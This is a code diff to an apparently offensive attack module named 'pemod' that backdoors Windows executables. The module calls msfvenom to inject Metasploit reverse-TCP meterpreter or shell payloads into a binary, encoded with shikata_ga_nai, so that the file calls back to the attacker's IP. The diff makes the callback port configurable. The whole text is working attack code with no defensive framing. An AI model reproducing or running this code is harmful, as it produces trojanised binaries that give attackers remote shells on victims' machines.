@@ -38,7 +38,11 @@ class pemod(Attack):
                                               required=False,
                                               opts=['windows/meterpreter/reverse_tcp',
                                                     'windows/shell/reverse_tcp'],
-                                              display="Payload to inject into binary.")
+                                              display="Payload to inject into binary."),
+                            "LPORT":Zoption(type="int",
+                                            value=5566,
+                                            required=False,
+                                            display="Port for reverse TCP connection")
                          })
         self.info = """
                     PEMod is a binary modifier capable of modifying unpacked executables
@@ -87,9 +91,10 @@ class pemod(Attack):
 
             # msfvenom it
             util.init_app('msfvenom -p %s -f exe -e x86/shikata_ga_nai '
-                          '-i 2 -k -x /tmp/.pe/%s LHOST=%s LPORT=5566 > /tmp/.pe/_%s' \
+                          '-i 2 -k -x /tmp/.pe/%s LHOST=%s LPORT=%d > /tmp/.pe/_%s' \
                           % (self.config['payload'].opts[self.config['payload'].value-1],
-                          bd_filename, config.get('ip_addr'), bd_filename))
+                          bd_filename, config.get('ip_addr'), self.config['LPORT'].value,
+                          bd_filename))
             util.init_app('mv /tmp/.pe/_%s /tmp/.pe/%s' % (bd_filename, bd_filename))
 
             return True
